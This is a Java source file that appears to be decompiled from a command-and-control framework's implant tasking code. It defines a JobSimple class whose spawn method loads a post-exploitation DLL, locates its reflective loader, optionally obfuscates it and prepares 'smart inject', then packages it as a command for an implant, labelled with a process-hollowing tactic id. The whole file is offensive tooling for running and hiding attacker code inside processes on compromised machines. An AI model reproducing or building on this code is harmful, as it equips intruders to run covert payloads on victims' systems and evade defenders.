package beacon;

import common.ReflectiveDLL;
import common.SleevedResource;
import pe.PostExObfuscator;

public abstract class JobSimple {
    protected CommandBuilder builder = new CommandBuilder();

    protected TaskBeacon tasker;

    protected String arch = "";

    protected int pid = 0;

    public JobSimple(TaskBeacon taskBeacon) {
        this.tasker = taskBeacon;
    }

    public abstract String getDescription();

    public abstract String getShortDescription();

    public abstract String getDLLName();

    public abstract byte[] getArgument();

    public abstract int getWaitTime();

    public boolean ignoreToken() {
        return true;
    }

    public int getCallbackType() {
        return 0;
    }

    public byte[] getDLLContent() {
        return SleevedResource.readResource(getDLLName());
    }

    public String getTactic() {
        return "T1093";
    }

    public byte[] fix(byte[] arrby) {
        return arrby;
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
    }

    public byte[] setupSmartInject(byte[] arrby) {
        return !this.tasker.useSmartInject() ? arrby : PostExObfuscator.setupSmartInject(arrby);
    }

    public byte[] _obfuscate(byte[] arrby) {
        PostExObfuscator postExObfuscator = new PostExObfuscator();
        postExObfuscator.process(arrby);
        obfuscate(postExObfuscator, arrby);
        return postExObfuscator.getImage();
    }

    public void spawn(String string) {
        byte[] arrby1 = getDLLContent();
        int i = ReflectiveDLL.findReflectiveLoader(arrby1);
        if (i <= 0) {
            this.tasker.error("Could not find reflective loader in " + getDLLName());
            return;
        }
        if (ReflectiveDLL.is64(arrby1)) {
            if (ignoreToken()) {
                this.builder.setCommand(71);
            } else {
                this.builder.setCommand(88);
            }
        } else if (ignoreToken()) {
            this.builder.setCommand(70);
        } else {
            this.builder.setCommand(87);
        }
        arrby1 = fix(arrby1);
        if (this.tasker.obfuscatePostEx())
            arrby1 = _obfuscate(arrby1);
        arrby1 = setupSmartInject(arrby1);
        byte[] arrby2 = getArgument();
        this.builder.addShort(getCallbackType());
        this.builder.addShort(getWaitTime());
        this.builder.addInteger(i);
        this.builder.addLengthAndString(getShortDescription());
        this.builder.addInteger(arrby2.length);
        this.builder.addString(arrby2);
        this.builder.addString(arrby1);
        byte[] arrby3 = this.builder.build();
        this.tasker.task(string, arrby3, getDescription(), getTactic());
    }
}
